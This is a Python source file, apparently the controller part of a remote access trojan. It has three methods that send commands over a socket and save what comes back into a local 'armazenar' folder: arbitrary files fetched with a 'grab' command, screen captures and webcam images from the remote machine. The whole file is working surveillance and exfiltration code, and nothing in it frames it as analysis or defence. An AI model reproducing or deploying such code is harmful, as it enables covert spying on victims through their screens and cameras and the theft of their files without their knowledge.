# coding: utf-8
class Transferir():

    def transferencias(self, conn, cmd):
        conn.send(cmd.encode())
        grab, path = cmd.split(' ')
        f = open('armazenar/' + path, 'wb')
        while True:
            bits = conn.recv(10000)
            if bits.endswith('DONE'.encode()):
                f.write(bits[:-4])
                f.close()
                print('Transferido ')
                break
            if 'File not found'.encode() in bits:
                print('Arquivo nao encontrado')
                break
            f.write(bits)

    def transferirImagem(self, conn, cmd):
        conn.send(cmd.encode())
        f = open('armazenar/imagem_Capturada.jpeg', 'wb')
        while True:
            bits = conn.recv(10000)
            if bits.endswith('DONE'.encode('utf-8')):
                f.write(bits[:-4])
                f.close()
              #  print('Capturado... ')
                break
            f.write(bits)

    def transferirCam(self, conn, cmd):
        conn.send(cmd.encode())
        f = open('armazenar/Cam.jpeg', 'wb')

        while True:
            bits = conn.recv(10000)
            if bits.endswith('DONE'.encode('utf-8')):
                f.write(bits[:-4])
                f.close()
                print('Camera')
                break
            f.write(bits)
